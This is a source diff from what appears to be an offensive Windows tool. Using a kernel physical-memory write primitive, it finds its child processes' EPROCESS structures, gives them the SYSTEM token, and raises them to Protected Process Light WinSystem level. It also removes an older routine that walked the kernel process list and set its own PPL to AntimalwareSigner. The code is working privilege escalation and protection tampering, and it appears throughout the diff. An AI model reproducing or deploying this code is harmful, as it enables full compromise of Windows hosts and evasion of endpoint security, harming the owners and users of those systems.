@@ -5,9 +5,89 @@
 #include "syscalls.h"
 #include "symbols.h"
 #include "physmem.h"
+#include "window.h"
 #include "protect.h"
 
 #pragma comment(lib, "advapi32.lib")
+
+// Every child of ours whose image name matches, so the console host can be
+// brought along with us.
+static void ForEachChildProcess(const wchar_t* imageName,
+                                void (*fn)(DWORD pid, void* ctx), void* ctx) {
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return;
+
+    DWORD parent = GetCurrentProcessId();
+    PROCESSENTRY32W entry = {};
+    entry.dwSize = sizeof(entry);
+    if (Process32FirstW(snapshot, &entry)) {
+        do {
+            if (entry.th32ParentProcessID == parent &&
+                _wcsicmp(entry.szExeFile, imageName) == 0)
+                fn(entry.th32ProcessID, ctx);
+        } while (Process32NextW(snapshot, &entry));
+    }
+    CloseHandle(snapshot);
+}
+
+struct ElevateCtx {
+    ULONG64 systemCr3;
+    KernelOffsets* offsets;
+    ULONG64 systemToken;
+    bool any;
+};
+
+// One EPROCESS lookup per child, then both writes: the child ends up with the
+// same primary token and the same PPL level as we do.
+static void ElevateOneChild(DWORD pid, void* rawCtx) {
+    ElevateCtx* ctx = (ElevateCtx*)rawCtx;
+    ULONG64 eprocVA = 0;
+    if (!WindowFindEprocessByPid(ctx->systemCr3, ctx->offsets, pid, false, &eprocVA)) {
+        printf("[-] Could not find the EPROCESS for child PID %u\n", pid);
+        return;
+    }
+
+    char label[64] = {};
+    wsprintfA(label, "PID %u", pid);
+
+    bool ok = false;
+    if (ctx->systemToken)
+        ok |= WindowSetProcessToken(ctx->systemCr3, ctx->offsets, eprocVA, ctx->systemToken, label);
+    ok |= WindowSetProcessPpl(ctx->systemCr3, ctx->offsets, eprocVA, PPL_FULL_WINSYSTEM);
+    if (ok) ctx->any = true;
+}
+
+bool MatchChildToSystem(ULONG64 systemCr3, KernelOffsets* offsets, const wchar_t* imageName) {
+    ElevateCtx ctx = { systemCr3, offsets, 0, false };
+    ctx.systemToken = WindowSystemToken(systemCr3, offsets);
+
+    ForEachChildProcess(imageName, ElevateOneChild, &ctx);
+    return ctx.any;
+}
+
+// Print the raw Protection byte for every matching child. The byte is the
+// ground truth: how a tool renders it is that tool's business, and a display
+// string like "Unknown (Lsa)" is easy to misattribute to the wrong process.
+struct ProtCtx {
+    ULONG64 systemCr3;
+    KernelOffsets* offsets;
+};
+
+static void ReportOneChildProtection(DWORD pid, void* rawCtx) {
+    ProtCtx* ctx = (ProtCtx*)rawCtx;
+    ULONG64 eprocVA = 0;
+    if (!WindowFindEprocessByPid(ctx->systemCr3, ctx->offsets, pid, false, &eprocVA)) {
+        printf("    child PID %u: EPROCESS not found\n", pid);
+        return;
+    }
+    printf("    child PID %u: Protection 0x%02X\n", pid,
+           WindowGetProcessProtection(ctx->systemCr3, ctx->offsets, eprocVA));
+}
+
+void ReportChildProtection(ULONG64 systemCr3, KernelOffsets* offsets, const wchar_t* imageName) {
+    ProtCtx ctx = { systemCr3, offsets };
+    ForEachChildProcess(imageName, ReportOneChildProtection, &ctx);
+}
 
 static DWORD FindWinlogonPid() {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -59,42 +139,6 @@ bool ImpersonateSystem() {
 
     if (result) printf("[+] SYSTEM token acquired\n");
     return result;
-}
-
-bool SetProcessPPL(HANDLE device, SyscallTable* sc, ULONG64 systemCr3, KernelOffsets* offsets) {
-    DWORD ourPid = GetCurrentProcessId();
-    ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
-    ULONG64 psActivePA = VirtToPhys(device, sc, systemCr3, psActiveVA);
-    if (!psActivePA) return false;
-
-    ULONG64 listHead = psActiveVA;
-    ULONG64 currentLink = PhysRead64(device, sc, psActivePA);
-    ULONG64 ourEprocess = 0;
-
-    int count = 0;
-    while (currentLink != listHead && currentLink != 0 && count < 500) {
-        count++;
-        ULONG64 eprocessVA = currentLink - offsets->ActiveProcessLinks;
-        ULONG64 eprocessPA = VirtToPhys(device, sc, systemCr3, eprocessVA);
-        if (!eprocessPA) break;
-
-        ULONG64 pid = PhysRead64(device, sc, eprocessPA + offsets->UniqueProcessId);
-        if ((DWORD)pid == ourPid) { ourEprocess = eprocessVA; break; }
-
-        ULONG64 nextPA = VirtToPhys(device, sc, systemCr3, currentLink);
-        if (!nextPA) break;
-        currentLink = PhysRead64(device, sc, nextPA);
-    }
-
-    if (!ourEprocess) return false;
-
-    ULONG64 protPA = VirtToPhys(device, sc, systemCr3, ourEprocess + offsets->Protection);
-    if (!protPA) return false;
-
-    BYTE ppl = 0x31; // Light + AntimalwareSigner
-    PhysWriteBuffer(device, sc, protPA, &ppl, 1);
-    printf("[+] PPL set (0x31)\n");
-    return true;
 }
 
 bool LockProcessDACL() {
